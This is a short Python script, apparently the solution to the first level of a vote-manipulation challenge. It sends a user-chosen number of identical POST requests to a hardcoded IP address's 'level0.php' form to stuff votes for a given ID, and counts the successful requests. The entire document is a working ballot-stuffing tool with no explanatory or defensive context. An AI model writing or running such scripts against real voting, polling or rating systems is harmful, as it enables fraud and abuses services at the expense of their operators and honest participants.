#!/usr/bin/python3


import requests

idd = int(input("Put your ID here: "))
form = {'id': idd, 'holdthedoor': 'Submit'}
sucess = 0
times = int(input("How many votes would you like?: "))

for i in range(0, times):
    req = requests.post("http://158.69.76.135/level0.php", data=form)
    if req.status_code == 200:
        sucess += 1
print("Request success: {:d}".format(sucess))
